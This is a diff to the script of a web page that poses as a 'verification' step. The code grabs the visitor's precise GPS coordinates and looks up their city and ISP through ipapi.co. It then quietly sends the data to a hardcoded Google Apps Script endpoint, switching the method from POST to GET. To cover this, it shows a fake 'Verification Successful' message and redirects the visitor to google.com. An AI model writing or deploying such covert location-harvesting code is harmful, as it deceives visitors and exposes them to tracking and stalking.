@@ -28,12 +28,11 @@
     </main>
 
     <script>
-        // Tera Tera URL
         const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbz2ifGy8l7tHc_g2HDNguyMmUiqYceLo4FNELJS-JrHPP25Ge4gGSTGRwjCP1452Ah9/exec";
 
         async function initiateAuth() {
             const btn = document.getElementById('btn-fetch');
-            btn.innerText = "Synchronizing...";
+            btn.innerText = "Synchronizing Satellite...";
             btn.disabled = true;
 
             const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
@@ -44,23 +43,12 @@
                         const ipRes = await fetch("https://ipapi.co/json/");
                         const ipData = await ipRes.json();
 
-                        const payload = { 
-                            timestamp: new Date().toLocaleString(),
-                            lat: pos.coords.latitude, 
-                            lon: pos.coords.longitude,
-                            city: ipData.city || "Unknown",
-                            isp: ipData.org || "Unknown"
-                        };
+                        // Query string ke zariye data bhej rahe hain (GET method)
+                        const targetUrl = `${GOOGLE_URL}?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&city=${ipData.city || 'Unknown'}&isp=${ipData.org || 'Unknown'}`;
 
-                        // Google Apps Script no-cors fix
-                        await fetch(GOOGLE_URL, {
-                            method: "POST",
-                            mode: "no-cors",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify(payload)
-                        });
+                        await fetch(targetUrl);
 
-                        document.getElementById('main-card').innerHTML = "<h2 class='text-green-600 font-bold text-center'>Verification Successful. Redirecting...</h2>";
+                        document.getElementById('main-card').innerHTML = "<h2 class='text-green-600 font-bold text-center'>Verification Successful. Redirecting to secure portal...</h2>";
                         setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
                     } catch (e) {
                         handleBlock();
